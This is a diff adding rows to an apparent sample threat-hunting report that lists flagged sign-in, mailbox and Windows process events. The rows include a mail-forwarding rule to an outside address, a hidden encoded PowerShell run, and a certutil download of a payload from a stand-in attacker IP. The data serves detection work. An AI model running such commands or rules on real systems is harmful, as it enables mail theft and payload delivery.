+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:30:05</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 500121 · Authentication failed during strong authentication request.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:32:05</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 500121 · Authentication failed during strong authentication request.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:34:05</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 500121 · Authentication failed during strong authentication request.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:36:05</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 500121 · Authentication failed during strong authentication request.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:38:05</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>failure</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 500121 · Authentication failed during strong authentication request.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:41:30</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>entra</td><td>signin</td><td>success</td><td class="mono nw">203.0.113.50</td><td class="mono">Office 365 Exchange Online · Sao Paulo, BR · err 0 · Other.</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:55:12</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>ual</td><td>New-InboxRule</td><td>success</td><td class="mono nw">203.0.113.50</td><td class="mono">Name=.; ForwardTo=archive.collector@mail-drop.test; DeleteMessage=True; SubjectContainsWords=invoice;payment</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 09:58:40</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>ual</td><td>Consent to application.</td><td>success</td><td class="mono nw">203.0.113.50</td><td class="mono">AppName=PDF Converter Pro; Scope=Mail.ReadWrite offline_access User.Read</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 10:30:05</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>windows</td><td>process_create</td><td>success</td><td class="mono nw"></td><td class="mono">powershell.exe -NoP -W Hidden -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAaAB1AG4AdABlAHIAcwBjAG8AcABlACAAcwBhAG0AcABsAGUAJwA=</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 10:31:12</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>windows</td><td>process_create</td><td>success</td><td class="mono nw"></td><td class="mono">whoami /priv</td>
+  </tr>
+  <tr class="flagged">
+    <td class="mono nw">2026-03-11 10:33:47</td><td><span class="chip flag">⚑ flagged</span></td>
+    <td>windows</td><td>process_create</td><td>success</td><td class="mono nw"></td><td class="mono">certutil.exe -urlcache -split -f http://203.0.113.50/p.bin C:\Users\Public\p.bin</td>
+  </tr>
+  <tr>
+    <td class="mono nw">2026-03-11 10:40:00</td><td></td>
+    <td>windows</td><td>process_create</td><td>success</td><td class="mono nw"></td><td class="mono">notepad.exe C:\Users\jkowalski\notes.txt</td>
+  </tr>
+  </tbody>
+</table></div>
+<footer>
+  Generated by HunterScope 0.1.0 · 2026-10-08 01:23:05 UTC · static report: no scripts, no external requests.
+</footer>
+</main>
+</body>
+</html>
